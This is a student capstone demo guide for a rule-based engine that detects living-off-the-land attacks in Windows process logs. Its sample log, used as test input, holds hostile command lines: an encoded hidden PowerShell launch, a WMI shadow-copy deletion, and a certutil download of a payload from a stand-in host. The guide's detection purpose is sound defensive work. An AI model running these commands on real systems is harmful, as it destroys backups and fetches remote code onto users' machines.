# B.Tech Capstone Project User Guide & Demonstration Manual
## Behavioral Detection Engine for Living-off-the-Land (LOLBin) Attacks

---

### 🚀 SECTION 1: HOW TO RUN THE APPLICATION (STEP-BY-STEP)

Your React Frontend is currently running on **`http://localhost:5173`**!  
Now you just need to start the **Spring Boot Backend** so that the live detection engine and MySQL connection are active.

#### Step 1: Open a New PowerShell / Command Prompt Window
Navigate to the `backend` folder:
```powershell
cd "C:\Users\rahul\OneDrive\Desktop\MA & RE\backend"
```

#### Step 2: Start the Spring Boot Backend Server
Run the automated launcher script:
```powershell
.\run_backend.ps1
```
*(If Maven is installed globally on your machine, you can also run `mvn spring-boot:run`)*

#### Step 3: Verify Connection
1. Wait a few seconds until the backend console prints:
   ```text
   =================================================
     Behavioral Detection Engine Started Successfully!
     REST API Base URL: http://localhost:8085/api
   =================================================
   ```
2. Go back to your browser at **`http://localhost:5173`** and click **"Retry Connection"** (or refresh the page).
3. The yellow *"Backend Offline"* banner will disappear!

---

### 🧪 SECTION 2: HOW TO TEST THE APPLICATION (INPUT TO OUTPUT)

#### Step 1: Go to the "Upload Logs" Page
In the top right navigation bar of the dashboard, click the button **`Upload Logs`**.

#### Step 2: Select the Synthetic Sample Attack Log File
1. Click **"Browse Log File..."**.
2. Navigate to your project folder:
   `C:\Users\rahul\OneDrive\Desktop\MA & RE\backend\src\main\resources\sample-logs\`
3. Select the file named: **`sample_attack_logs.json`**.
4. Click **"Analyze Security Logs"**.

#### Step 3: View Analysis Results
Immediately after clicking Analyze, a green success box will appear displaying:
- **Analysis Run ID:** `#1`
- **Total Events Processed:** `5`
- **Alerts Triggered:** `3`

---

### 📊 SECTION 3: INPUT LOG FORMAT VS OUTPUT DETECTIONS

#### 1. Input Data (`sample_attack_logs.json`)
The log file contains process creation event logs containing raw process names and command lines:
```json
[
  {
    "eventId": "EVT-1001",
    "processName": "powershell.exe",
    "commandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFA..."
  },
  {
    "eventId": "EVT-1002",
    "processName": "wmic.exe",
    "commandLine": "wmic.exe shadowcopy delete"
  },
  {
    "eventId": "EVT-1003",
    "processName": "certutil.exe",
    "commandLine": "certutil.exe -urlcache -split -f http://malicious-server.org/payload.png payload.exe"
  }
]
```

#### 2. Generated Outputs (View in "Security Alerts" Tab)
Click the **`Security Alerts`** tab in the top navigation bar to inspect the 3 detected attack chains:

| Detected Scenario | Matched Rule ID | Severity | MITRE ATT&CK Mapping | Detection Explanation |
| :--- | :---: | :---: | :---: | :--- |
| **PowerShell Abuse** | `RULE-PS-001` | **HIGH** | `T1059.001` & `T1027` | Detects stealth evasion flags (`-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, `-EncodedCommand`). |
| **WMI Shadow Copy Deletion** | `RULE-WMI-001` | **CRITICAL** | `T1047` & `T1490` | Detects `wmic.exe shadowcopy delete` used by ransomware to destroy system backups prior to encryption. |
| **Certutil Ingress Abuse** | `RULE-CERT-001` | **HIGH** | `T1105` & `T1140` | Detects `certutil.exe` abusing `-urlcache` parameters to download external binary payloads past firewalls. |

---

### 🔍 SECTION 4: INTERACTIVE FEATURES TO DEMONSTRATE TO FACULTY

1. **Severity Filtering:**  
   On the **Security Alerts** page, select **"CRITICAL"** from the severity dropdown menu. Notice that only the WMI ransomware shadow copy deletion alert is displayed.
2. **Search Bar:**  
   Type `powershell` or `certutil` into the live search box. The table instantly filters matching records.
3. **Alert Inspection Modal:**  
   Click the **"Inspect"** button next to any alert. A popup window opens showing:
   - Raw Command-Line execution string in code syntax.
   - Exact behavioral heuristic explanation.
   - Interactive **Investigation Status** dropdown (`NEW` -> `INVESTIGATING` -> `RESOLVED`).
4. **Analysis History:**  
   Click the **"Analysis History"** tab to view persistent records of previous log upload sessions stored in MySQL.
5. **Dynamic Dashboard Metrics:**  
   Click **"Dashboard"**. Notice that the total analyses card (`1`), events processed card (`5`), total alerts generated card (`3`), and critical detections card (`1`) have all updated automatically from the Spring Boot REST API!

---

### 🗄️ SECTION 5: MYSQL DATABASE VERIFICATION

To show your faculty that data is persistently stored in MySQL:
1. Open **MySQL Workbench**.
2. Run the SQL query:
   ```sql
   USE lol_detector_db;
   SELECT * FROM analysis_runs;
   SELECT * FROM security_alerts;
   ```
3. Show the table rows created for your upload session!

---

### 🎓 SECTION 6: WHAT TO SAY TO FACULTY DURING DEMONSTRATION

> *"Respected faculty, traditional antivirus software looks for malware file signatures on disk. However, modern attackers abuse pre-installed Microsoft utilities like PowerShell, WMI, and Certutil to perform fileless attacks. Because these utilities are digitally signed by Microsoft, signature-based antivirus cannot block them.*
>
> *Our B.Tech capstone project solves this by building a rule-based Behavioral Detection Engine in Java Spring Boot. It parses process creation logs, evaluates command-line arguments against behavioral heuristic rules, identifies malicious intent, maps detections to MITRE ATT&CK techniques, stores audit runs in MySQL, and presents them in an interactive React dashboard."*
